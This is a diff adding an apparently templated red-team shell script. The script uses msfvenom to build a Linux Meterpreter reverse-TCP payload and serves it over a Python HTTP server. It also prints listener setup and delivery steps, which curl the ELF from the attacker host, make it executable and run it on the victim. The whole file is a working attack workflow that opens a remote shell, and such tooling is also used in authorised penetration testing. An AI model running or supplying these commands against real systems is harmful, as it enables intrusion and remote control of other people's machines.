@@ -1,0 +1,12 @@
+mkdir -p packstation/outbound; echo 'msfvenom creates the payload. Please wait...'; \
+msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=<%=$(esh variables/attacker_ip)%> LPORT=<%=$(esh variables/shell_port)%> -f elf > packstation/outbound/revshell.elf ; \
+echo '================================================================'; \
+echo '                      ------Listener------                      '; \
+echo '1. Start listener: <% echo $(esh scripts/listener-msf-multi-handler-linux-x64-meterpreter-nonstaged) %>'; \
+echo '================================================================'; \
+echo '                       -----Linux------                         '; \
+echo '2. Deliver: curl http://<%=$(esh variables/attacker_ip)%>:<%=$(esh variables/delivery_outbound_port)%>/revshell.elf -o <%=$(esh variables/delivery_path_linux)%>/revshell.elf'; \
+echo '3. Make executable: chmod +x <%=$(esh variables/delivery_path_linux)%>/revshell.elf'; \
+echo '4. Execute: <%=$(esh variables/delivery_path_linux)%>/revshell.elf'; \
+echo '================================================================'; \
+python -m http.server <%=$(esh variables/delivery_outbound_port)%> -d packstation/outbound
